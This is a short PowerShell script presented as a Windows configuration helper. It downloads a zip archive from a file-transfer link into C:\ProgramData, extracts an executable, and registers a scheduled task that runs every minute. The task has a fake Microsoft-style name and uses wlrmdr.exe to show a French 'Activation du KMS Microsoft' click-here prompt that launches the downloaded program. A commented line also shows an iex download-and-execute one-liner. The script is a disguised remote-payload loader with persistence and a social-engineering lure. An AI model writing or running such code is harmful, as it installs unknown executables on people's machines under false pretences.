# iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Maestran/windows-config/main/config.ps1'))

Invoke-WebRequest -Uri "dl-hirfcpln.swisstransfer.com/api/download/922abc79-ea12-4815-8cf5-b547e0876fd3/65e7aa0a-fcfe-459a-a6bf-8377790f8256" -OutFile "C:\ProgramData\config.zip"
Expand-Archive -Path "C:\ProgramData\config.zip" -DestinationPath "C:\ProgramData\WindowsConfigManager"
$action=New-ScheduledTaskAction -Execute "wlrmdr.exe" -Argument '-s 3600 -f 0 -t Cliquez ici! -m Activation du KMS Microsoft -a 10 -u "C:\ProgramData\WindowsConfigManager\WindowsConfigManager\windows-compat.exe"'
$trigger=New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1) 
Register-ScheduledTask -TaskName "Systeme de comptabilite Microsoft" -Description "Assure la liste des services actifs" -Trigger $trigger -Action $action 
